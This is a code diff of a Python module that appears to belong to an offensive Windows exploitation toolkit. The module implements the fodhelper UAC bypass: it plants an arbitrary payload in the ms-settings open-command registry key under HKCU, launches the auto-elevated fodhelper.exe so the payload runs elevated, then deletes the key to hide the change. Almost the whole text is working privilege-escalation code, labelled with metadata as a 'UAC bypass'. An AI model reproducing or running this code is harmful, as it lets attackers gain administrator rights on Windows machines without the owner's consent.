@@ -1,67 +1,49 @@
-"""
-Works from: Windows 10 TH1 (10240)
-Fixed in: unfixed
-"""
 import os
-import wmi
 import time
 import _winreg
 from core.prints import *
+from core.utils import *
 
-wmi = wmi.WMI()
+fodhelper_info = {
+        "Description": "Bypass UAC using fodhelper and registry key manipulation",
+		"Id" : "02",
+		"Type" : "UAC bypass",
+		"Fixed In" : "999999",	
+		"Works From": "10240",
+		"Admin": False,
+		"Function Name": "fodhelper",
+		"Function Payload": True,
+    }
 
 def fodhelper(payload):
-	print """
- --------------------------------------------------------
- fodhelper.exe is an auto-elevated binary that is
- vulnerable to file handler hijacking. 
- 
- Read access to HKCU\Software\Classes\ms-settings\shell\open
- \command is performed upon execution. Due to the registry
- key being accessible from user mode, an arbitrary
- executable file can be injected.
-
- When everything worked correctly, the payload should be
- spawned with high IL.
- --------------------------------------------------------
- """
-	print_info("Payload: {}".format(payload))
-	print_info("Hijacking Software\\Classes\\ms-settings\\shell\\open\\command")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))						
-		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
+		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,os.path.join(payload))
 		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
 		_winreg.CloseKey(key)
 	except Exception as error:
-		print_error("Unable to create Default and DelegateExecute key")
+		print_error("Unable to create registry keys, exception was raised: {}".format(error))
 		return False
 	else:
-		print_success("Successfully created Default and DelegateExecute key")
+		print_success("Successfully created Default key containing payload ({})".format(os.path.join(payload)))
+		print_success("Successfully created DelegateExecute key")
 
-	print_info("Pausing for 5 seconds before executing")
 	time.sleep(5)
 
-	print_info("Attempting to create process (cmd.exe /c start fodhelper.exe)")
-	try:
-		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start fodhelper.exe",
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
-		if (result[1] == 0):
-			print_success("Process started successfully (cmd.exe /c start fodhelper.exe)")
+	print_info("Disabling file system redirection")
+	with disable_fsr():
+		print_success("Successfully disabled file system redirection")
+		if (process().create("cmd.exe /c start fodhelper.exe",1) == True):
+			print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 		else:
-			print_error("Problem creating process (cmd.exe /c start fodhelper.exe)")
-			return False
-	except Exception as error:
-		print_error("Problem creating process (cmd.exe /c start fodhelper.exe)")
-		return False
+			print_error("Unable to spawn process ({})".format(os.path.join(payload)))		
 	
-	print_info("Pausing for 5 seconds before cleaning")
 	time.sleep(5)
 
-	print_info("Attempting to delete and restore hijacked registry keys")
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))
 	except Exception as error:
-		print_error("Unable to clean")
+		print_error("Unable to cleanup")
 		return False
 	else:
-		print_success("Successfully, our payload ({}) should now run elevated".format(payload))
+		print_success("Successfully cleaned up, enjoy!")
